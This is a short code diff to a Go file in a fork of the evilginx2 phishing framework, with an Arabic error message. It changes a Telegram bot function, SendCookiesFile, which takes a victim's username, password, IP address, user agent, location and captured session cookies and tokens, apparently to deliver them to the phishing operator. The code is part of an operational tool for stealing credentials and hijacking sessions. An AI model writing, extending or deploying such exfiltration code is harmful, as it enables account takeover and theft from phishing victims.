@@ -12,6 +12,8 @@ import (
 	"mime/multipart"
 
 	"github.com/kgretzky/evilginx2/log"
+	    "github.com/kgretzky/evilginx2/database"
+    "encoding/json"
 )
 
 type TelegramBot struct {
@@ -614,7 +616,7 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 	return nil
 } 
 
-func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username string, password string, remoteAddr string, userAgent string, country string, countryCode string, cookieTokens map[string]map[string]*database.CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
+func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username string, password string, remoteAddr string, userAgent string, country string, countryCode string, cookieTokens map[string]map[string]interface{}, bodyTokens map[string]string, httpTokens map[string]string) error {
 	if !t.Enabled {
 		return fmt.Errorf("بوت التليجرام غير مفعل")
 	}
